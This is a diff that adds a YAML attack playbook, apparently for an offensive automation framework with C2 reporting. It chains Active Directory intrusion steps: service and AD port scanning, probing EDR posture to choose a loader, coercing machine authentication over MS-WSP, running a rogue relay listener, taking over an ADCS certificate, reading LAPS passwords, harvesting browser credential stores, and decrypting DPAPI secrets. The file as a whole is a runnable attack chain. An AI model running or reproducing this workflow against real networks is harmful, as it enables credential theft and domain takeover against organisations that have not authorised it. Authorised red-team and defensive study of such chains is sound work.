@@ -1,0 +1,97 @@
+name: apt_ad_coerce
+version: 1
+description: 'AD coercion-relay golden path: map AD services, review EDR posture,
+  drive SMB coercion for authentication capture, run a rogue-auth listener,
+  attempt ADCS certificate takeover, read LAPS local admin password and
+  harvest DPAPI secrets. Addon params come from payload.json; assign them
+  (domain, start_user, start_pass) before running. Policy: watch the
+  coercion and relay profilers before any destructive exploitation.'
+enabled: true
+tags:
+- apt
+- ad
+- windows
+- credentials
+platforms:
+- windows
+defaults:
+  playbook: ''
+  domain: ''
+  start_user: ''
+  start_pass: ''
+steps:
+- id: scope
+  phase: recon
+  description: Bind the engagement target.
+  run: assign target {target}
+- id: bind_domain
+  phase: recon
+  description: Bind the AD domain when the operator left it empty.
+  run: assign domain {domain}
+  when: not domain
+  continue_on_error: true
+- id: scan
+  phase: recon
+  description: Service scan once and reuse the XML on later runs.
+  run: lazynmap {target}
+  skip_if_exists: sessions/scan_{target}.nmap.xml
+  timeout: 900
+- id: ad_map
+  phase: enum
+  description: Fingerprint AD services (LDAP, SMB, Kerberos, Global Catalog).
+  run: nmap -Pn -sT -p53,88,135,139,389,445,464,636,749,3268,5985,9389 --script ldap-rootdse,smb-os-discovery.nse,rdp-ntlm-info {target}
+  timeout: 600
+- id: posture
+  phase: enum
+  description: EDR/AV posture probe feeding the loader decision.
+  run: edr_detect --target {target} --type wmi
+  timeout: 300
+  continue_on_error: true
+- id: capture
+  phase: exploit
+  description: Coerce machine authentication over MS-WSP for hash capture.
+  run: wspcoerce
+  timeout: 300
+  continue_on_error: true
+- id: relay_listen
+  phase: exploit
+  description: Rogue authentication listener to relayout captured incoming auth.
+  run: pretender
+  timeout: 300
+  continue_on_error: true
+- id: cert_takeover
+  phase: lateral
+  description: ADCS enumeration and certificate attack against the CA.
+  run: adcs_attacks
+  timeout: 600
+  continue_on_error: true
+- id: laps_read
+  phase: credentials
+  description: Attempt LAPS local administrator password read.
+  run: laps
+  timeout: 300
+  continue_on_error: true
+- id: browser_creds
+  phase: credentials
+  description: Harvest browser credential stores from the compromised host.
+  run: hack_browser_data
+  timeout: 300
+  continue_on_error: true
+- id: dpapi
+  phase: credentials
+  description: Decrypt DPAPI-protected secrets where master keys are available.
+  run: dpapi_harvest
+  timeout: 300
+  continue_on_error: true
+- id: sync
+  phase: report
+  description: Mirror loop graphs into world model and objectives.
+  run: lazy_sync
+  timeout: 120
+  continue_on_error: true
+- id: session
+  phase: report
+  description: Refresh the C2 session report.
+  run: create_session_json
+  timeout: 120
+  continue_on_error: true
